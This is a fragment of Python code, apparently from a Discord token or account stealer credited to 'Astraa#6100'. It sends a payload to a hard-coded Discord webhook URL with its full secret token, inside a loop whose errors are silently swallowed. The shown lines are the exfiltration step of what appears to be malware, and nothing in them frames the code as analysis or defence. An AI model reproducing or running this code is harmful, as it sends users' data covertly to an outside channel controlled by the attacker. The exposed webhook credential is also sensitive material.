...
*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
                        ...
                        try:
                            ...
                            req = Request('https://discord.com/api/webhooks/1251955550913302629/NLu2JbpNMzS0B4Mo97H_yCz5CRX727ZutQFhhD4Z2-UyFkdv5q7pNVd8awq0WyHehVhe', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
